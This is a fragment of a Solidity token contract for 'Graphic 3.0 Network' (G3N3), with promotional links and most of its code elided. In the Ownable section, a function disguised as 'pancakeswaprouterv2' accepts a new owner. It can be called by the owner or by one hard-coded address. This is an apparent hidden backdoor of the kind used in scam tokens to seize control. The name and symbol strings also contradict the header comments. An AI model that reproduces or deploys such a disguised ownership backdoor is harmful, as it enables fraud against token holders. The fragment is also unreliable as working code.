...
//G3N3 Token
//Token Name: Graphic 3.0 Network
//Token Symbol: G3N3
//Token Decimal: 9
//Token Supply: 100.000.000.000
//https://twitter.com/Graphic3Network
//https://t.me/Graphic3Network
interface IERC20 {
...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x86f18947b9Ab1C640F174D430d8D4bD57Dd12fAB));
...
contract Graphic30Network is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "Graphic 3.0";
  string private _name = "G3N3";
